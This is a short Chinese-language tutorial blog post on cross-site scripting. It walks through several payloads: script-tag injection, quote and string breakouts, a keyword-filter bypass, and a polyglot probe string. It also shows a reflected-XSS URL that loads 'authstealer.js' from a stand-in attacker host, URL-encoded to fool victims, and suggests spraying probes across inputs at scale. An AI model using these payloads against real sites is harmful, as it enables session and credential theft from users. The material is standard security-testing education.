---
weight: 1
title: "手把手教你xss攻击"
date: 2024-03-08T09:03:21+08:00
lastmod: 2024-03-08T09:03:21+08:00
draft: false
author: "乙醇"
authorLink: "https://github.com/easonhan007"
description: "有手就会"
images: []
resources:
  - name: "featured-image"
    src: "https://images.unsplash.com/photo-1658954382154-fe7d69fdcf78?w=300"

tags: []
categories: ["测试工具", "软件测试基础"]

lightgallery: true

toc:
  auto: false
---

一句话解释 xss 就是通过提供恶意的用户输入让浏览器执行恶意的 JavaScript 代码。

### 最简单的例子

```jsx
<div>
    <h1> Welcome {your input} </h1>
</div>
```

这里页面希望你通过文本框输入自己名字，然后把你输入的名字展示出来。假如你输入的名字是:`<script>alert('XSS')</script>`

这时候浏览器将解析下面的 html 代码

```jsx
<div>
  <h1>
    {" "}
    Welcome <script>alert('XSS')</script>
  </h1>
</div>
```

script 标签里的 js 代码就被执行了，这就是一个最简单的 xss。

### 复杂一点点的例子

```jsx
<div>
    <h1> Welcome <input value="{your input}"</h1>
</div>
```

这时候如果你输入`<script>alert('XSS')</script>` 那么将得到类似下面的结果

```jsx
<div>
    <h1> Welcome <input "<script>alert('XSS')</script>"</h1>
</div>
```

因为 script 标签被包含在双引号里，浏览器会认为这是一个普通的字符串，所以不会执行 js 代码。不过如果你输入`“"><script>alert('XSS');</script>”` 那么你将会打开一个新的局面

```jsx
<div>
    <h1> Welcome <input ""><script>alert('XSS')</script></h1>
</div>
```

input 标签被强行闭合，script 标签成功上位。这时候 js 代码又可以执行了。

### 再来个例子

```jsx
<script>document.getElementsByClassName('name')[0].innerHTML='{input}';</script>
```

这个例子里我们要想办法在现有的代码中插入恶意的 js 代码，这里需要用到 2 点小知识

- js 代码中`;`号可以结束一行语句
- js 代码中`//`表示后面的所有内容都是注释，可以被忽略掉

因此如果我们输入的是`';alert('XSS');//` 那么中间的 alert 语句是可以执行的

```jsx
<script>
  document.getElementsByClassName('name')[0].innerHTML='';alert('XSS');//'
</script>
```

前面的单引号被第 1 个单引号匹配并终结，后面的分号直接结束了这一句，而后面的那个单引号则被`//` 注释掉了，所以中间的 alert 代码是可以顺利执行的。

### 还有例子

有时候页面会过滤掉一些危险的关键字，比如 script 标签，这时候可以试试构造下面的数据

```jsx
<sscriptcript>alert('XSS');</sscriptcript>
```

当 script 标签被过滤掉之后，html 代码如下

```jsx
<script>alert('XSS');</script>
```

恶意代码可以顺利执行。

### 探针

如果每次见招拆招的话，那么攻击的效率是不太高的，这时候就可以试试下面的这种标准化探针字符串，如果页面存在一些基本的 xss 漏洞的话，下面的代码是可以被顺利执行的。

```jsx
jaVasCript: /*-/*`/*\`/*'/*"/**/ /* */ onerror = alert("XSS"); //%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

我们可以使用自动化的工具在页面上所有可以输入的地方批量植入探针，这样就可以大规模高效率的进行攻击了。

### 非持久化的 xss

上面的例子是持久化的 xss，简单来说就是需要把用户输入的内容保存到数据库里然后在页面进行回显，在现实中其实还有一种不需要持久化就进行 xss 攻击的例子。

下面的例子来自维基百科。

假设我们有一个搜索页面，该页面会回显 url 里的 q 参数，比如`http://bobssite.org/search**?q=**<script>alert('xss');</script>` \*\*\*\*q 参数后面的内容会回显到搜索框里，这样就可以把搜索结果简单的复制给其他人了。然而如果我们搜索的内容是带恶意脚本的 script 标签的话，在标签没有被转义的情况下，页面就会在回显的时候直接执行标签里的脚本了。

这种方式还可以这样玩，比如

```jsx
http://bobssite.org/search?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js">
```

这样就可以执行 authstealer.js 脚本了，后面的事情有点复杂，就不过多描述了。

最后为了不引起被害者的警觉，我们还可以把 url 中的内容编码一下

```jsx
http://bobssite.org/search?q=puppies%3Cscript%20src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E
```

这样被害人收到这样链接的时候就更有可能随手一点了。

### 总结

xss 攻击是最常见的前端攻击方式，一般情况下常用的前端框架都有安全机制尽量避免 xss 的发生，但武器库里有防身的工具，不见得所有的开发者都会熟练应用，因此 xss 漏洞始终是有可能出现的。
